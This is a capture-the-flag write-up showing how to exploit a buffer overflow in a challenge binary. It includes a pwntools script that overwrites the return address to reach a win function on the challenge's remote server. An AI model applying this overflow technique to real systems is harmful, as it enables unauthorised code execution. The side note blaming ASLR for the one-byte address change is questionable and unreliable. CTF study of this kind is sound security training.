# Free flag write-up

Heya folks, this is how I solved "Free Flag" challenge using python3 pwntools:

## The challenge
They give you a small binary called "chall". If we run file on it it shows us the following:

```
file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=518d3397ca0a0d5e98e900e3f2e2937de34e3554, not stripped
```

From the architecture x86-64 we can guess it's little endian, useful for the later exploit.

## Reversing the ELF

After messing around for a while with the binary, we can determine there exists a Buffer Overflow at throwing at him 40 characters.
If we debug it with gdb using the command `info functions` we find an interesting address to jump, the function win_win:

```
0x0000000000400707  win_win
```

With this information, we are ready to try and exploit it!

## Solution
I always prefer to use python3 to do my exploits whilst possible so here's the script I wrote:

```python3
#!/usr/bin/env python3
from pwn import *

payload = 'A' * 40 + "\x08\x07\x40"
shell = remote('europe.pwn.zh3r0.ml',3456)
shell.send(payload)
shell.interactive()
```

We run it and get the flag.

Side note: when trying the exploit for the first time, didn't get any result. I figured out the file was ASLR-Protected, so had to change the last byte of the function address in order to make it work
